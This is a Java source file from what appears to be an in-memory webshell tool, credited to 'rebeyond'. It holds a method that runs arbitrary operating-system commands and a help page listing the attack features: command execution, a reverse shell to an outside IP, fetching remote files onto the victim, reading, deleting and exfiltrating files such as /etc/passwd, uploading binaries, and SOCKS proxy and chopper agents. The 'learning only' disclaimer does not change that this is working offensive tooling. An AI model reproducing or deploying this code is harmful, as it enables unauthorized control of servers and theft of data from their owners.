package priv.memshelltest;

import java.io.DataInputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class Shells {
    public static String execute(String cmd) throws Exception {
        String result = "";
        if (cmd != null && cmd.length() > 0) {

            Process p = Runtime.getRuntime().exec(cmd);
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while (disr != null) {
                result = result + disr + "\n";
                disr = dis.readLine();
            }
        }
        return result;
    }
    public static String help() {
        return "Webshell in Memory:\n\n" + "Usage:\n" + "anyurl?pwd=pass //show this help page.\n"
                + "anyurl?pwd=pass&model=exec&cmd=whoami  //run os command.\n"
                + "anyurl?pwd=pass&model=connectback&ip=8.8.8.8&port=51 //reverse a shell back to 8.8.8.8 on port 51.\n"
                + "anyurl?pwd=pass&model=urldownload&url=http://xxx.com/test.pdf&path=/tmp/test.pdf //download a remote file via the victim's network directly.\n"
                + "anyurl?pwd=pass&model=list[del|show]&path=/etc/passwd  //list,delete,show the specified path or file.\n"
                + "anyurl?pwd=pass&model=download&path=/etc/passwd  //download the specified file on the victim's disk.\n"
                + "anyurl?pwd=pass&model=upload&path=/tmp/a.elf&content=this_is_content[&type=b]   //upload a text file or a base64 encoded binary file to the victim's disk.\n"
                + "anyurl?pwd=pass&model=proxy  //start a socks proxy server on the victim.\n"
                + "anyurl?pwd=pass&model=chopper  //start a chopper server agent on the victim.\n\n"
                + "For learning exchanges only, do not use for illegal purposes.by rebeyond.\n";
    }
}
